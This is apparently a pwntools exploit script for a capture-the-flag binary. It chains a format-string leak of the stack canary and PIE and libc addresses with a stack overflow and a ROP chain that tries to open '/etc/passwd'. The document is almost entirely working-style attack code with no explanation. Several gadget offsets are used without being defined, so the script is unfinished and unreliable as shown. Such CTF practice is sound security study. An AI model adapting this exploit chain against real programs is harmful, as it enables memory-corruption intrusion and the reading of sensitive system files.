# -- coding: utf-8 --
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# ENV
e = context.binary = ELF('./task')
lib = e.libc

# lib= ELF('libc-2.27.so')
PORT = 33744
HOST = "0.cloud.chals.io"
r = e.process()
# r = remote(HOST,PORT)

setvbuf_got_offset=0x201385
write_plt_offset= -0x34b
main = 0x00000000004011ea

payload=b"%15$p|%17$p|%19$p"
pause()

r.sendlineafter(b"message: ",payload)
leaks= r.recvline()[:-1].split(b"|")
canary = int(leaks[0],16)
main = int(leaks[1],16)-24
echo=main+19

libc_start_call_main_128 = int(leaks[2],16)

setvbuf_got= main+setvbuf_got_offset
write_plt = main+write_plt_offset

log.info("canary: %#x" %canary)
log.info("main: %#x" %main)
log.info("libc_start_call_main+128: %#x" %libc_start_call_main_128)

log.info("setvbuf_got: %#x" %setvbuf_got)
log.info("write_plt: %#x" %write_plt)

#libc and pie
piebase=main-0xc4b
libc_base =libc_start_call_main_128-0x021c87
printf_plt= piebase+0x930

log.info("piebase: %#x" %piebase)
log.info("libc_base: %#x" %libc_base)

pop_rdi_ret= piebase+pop_rdi_ret_offset
pop_rsi_r15_ret= piebase+pop_rsi_r15_ret_offset
ret= piebase+ret_offset
write_echo =piebase+0xBE3
gets_echo=piebase+0xBF9
syscall = libc_base+0xc25b0    

log.info("pop_rdi_ret: %#x" %pop_rdi_ret)
log.info("pop_rsi_r15_ret: %#x" %pop_rsi_r15_ret)
log.info("ret: %#x" %ret)
log.info("printf_plt: %#x" %printf_plt)
log.info("syscall: %#x" %syscall)

pop_rbx_rbp_r12_13_14_15_ret =piebase+0xCCA
mov_rdx_r15_mov_rsi_r14_mov_edi_r13=piebase+0xCB0

pop_rbp_ret =piebase+0x00000000000009e0
pop_ax_dx_bx_ret =libc_base+0x4a678
pop_rax_ret = libc_base + 0x45eb0
pop_rsi_ret =libc_base + 0x3e51
pop_rdx_syscall= libc_base+ 0x22c4c4

path_flag=b"/etc/passwd"

payload = path_flag.ljust((0x50-8), b"a")
payload+= p64(canary)+b"b"*8
#open 
payload+= flat( pop_rbp_ret, setvbuf_got+0x550, gets_echo ) 
# pause()
r.sendlineafter(b"message: ",payload)
pause()
r.sendline(b"x")


path_flag_add= setvbuf_got+0x500
payload = b"x"*0x48
payload+= p64(canary)
payload+= flat(1, ret, pop_rdi_ret, path_flag_add, pop_rsi_ret, 0 , pop_rdx_syscall,0 )
# payload = payload.ljust(0xc8, b"\x00")
# payload+= flat(ret,pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, path_flag_add+0x1000 , pop_rdx_syscall,1000 )
# payload = payload.ljust(0x118, b"\x00")
# payload+= flat(ret,pop_rax_ret, 1, pop_rdi_ret, 1, pop_rsi_ret, path_flag_add+0x1000 , pop_rdx_syscall,1000 )
# pause()
r.sendlineafter(b"message: ",payload)
pause()
r.sendline(b"x"*15)



r.interactive()

